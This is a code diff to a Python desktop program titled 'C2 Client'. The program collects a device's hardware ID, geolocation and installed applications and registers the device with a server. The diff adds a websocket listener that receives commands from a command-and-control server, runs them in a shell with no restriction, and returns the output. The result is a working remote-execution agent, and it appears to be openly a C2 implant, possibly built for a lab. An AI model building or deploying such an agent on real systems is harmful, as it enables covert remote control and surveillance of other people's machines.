@@ -1,6 +1,12 @@
+# client.py
+
 import tkinter as tk
 import threading
 import platform
+import websockets
+import subprocess
+import json
+import asyncio
 from tkinter import ttk, messagebox, filedialog
 from PIL import Image, ImageTk
 from utils.device_info import load_hardware_id, get_geolocation, get_installed_apps
@@ -20,6 +26,7 @@ class ClientApp:
     def __init__(self, root):
         self.root = root
         self.is_running = True
+        self.websocket = None
         self.root.title("C2 Client")
         # self.root.geometry("300x300")
         
@@ -36,6 +43,9 @@ class ClientApp:
         self.geo_location = get_geolocation()
         self.installed_apps = get_installed_apps()
 
+        self.websocket_uri = f"ws://localhost:5000/ws/device/{self.hardware_id}"
+
+
         # Create tray icon if supported
         if TRAY_SUPPORTED:
             self.tray_icon = create_tray_icon(self.blue_eye, self.restore_window, 
@@ -49,6 +59,9 @@ class ClientApp:
         add_device(self.device_name, self.os_version, self.hardware_id, self.geo_location, self.installed_apps)
         send_heartbeat(self.hardware_id, self.update_device_status, self.show_rejoin_button, self.hide_rejoin_button)
         # check_for_commands(self.hardware_id, self.execute_command)
+
+        self.ws_thread = threading.Thread(target=self.start_websocket_listener, daemon=True)
+        self.ws_thread.start()
 
         # Start background terminal input listener
         threading.Thread(target=self.terminal_input_listener, daemon=True).start()
@@ -142,11 +155,6 @@ class ClientApp:
         if hasattr(self, 'rejoin_button'):
             self.rejoin_button.grid_remove()
 
-    # def execute_command(self, command):
-    #     """Execute a command and return the result."""
-    #     result = execute_command(command)
-    #     return result
-
     def request_watchlist_rejoin(self):
         """Send request to rejoin the watchlist."""
         success = request_watchlist_rejoin(self.hardware_id)
@@ -154,6 +162,70 @@ class ClientApp:
             messagebox.showinfo("Request Sent", "Request to rejoin the watchlist sent successfully.")
         else:
             messagebox.showerror("Request Failed", "Failed to send request to rejoin the watchlist.")
+
+    async def websocket_listener(self):
+        try:
+            self.websocket = await websockets.connect(self.websocket_uri)
+            print("WebSocket connection established.")
+            await self.websocket.send(json.dumps({"type": "check", "message": "Client running"}))
+
+            while True:
+                print("Waiting for message from server...")
+                message = await self.websocket.recv()
+                print(f"Message received: {message}")  # Debug log to check received message
+                data = json.loads(message)
+
+                if data.get("type") == "command":
+                    command = data.get("command")
+                    print(f"Executing command: {command}")
+
+                    # Execute the command
+                    result = self.execute_command(command)
+                    print(f"Command result: {result}")
+
+                    # Send the result back to the server
+                    await self.websocket.send(json.dumps({
+                        "type": "command_result",
+                        "hardware_id": self.hardware_id,
+                        "result": result
+                    }))
+                    print("Command result sent.")
+
+                elif data.get("type") == "echo_response":
+                    print(f"Echo response received: {data.get('message')}")
+
+                else:
+                    print(f"Unknown message type received: {data}")
+
+        except websockets.ConnectionClosed as e:
+            print(f"WebSocket connection closed: {e}. Reconnecting...")
+            await asyncio.sleep(5)
+        except Exception as e:
+            print(f"Error in WebSocket listener: {e}")
+        finally:
+            self.websocket = None
+
+
+    def execute_command(self, command):
+        """Execute the received command and return the output."""
+        try:
+            result = subprocess.run(
+                command, shell=True, capture_output=True, text=True, timeout=10
+            )
+            if result.returncode == 0:
+                return result.stdout.strip()
+            else:
+                return f"Error: {result.stderr.strip()}"
+        except subprocess.TimeoutExpired:
+            return "Error: Command timed out"
+        except Exception as e:
+            return f"Error: {str(e)}"
+
+
+
+    def start_websocket_listener(self):
+        asyncio.run(self.websocket_listener())
+
 
 
 if __name__ == "__main__":
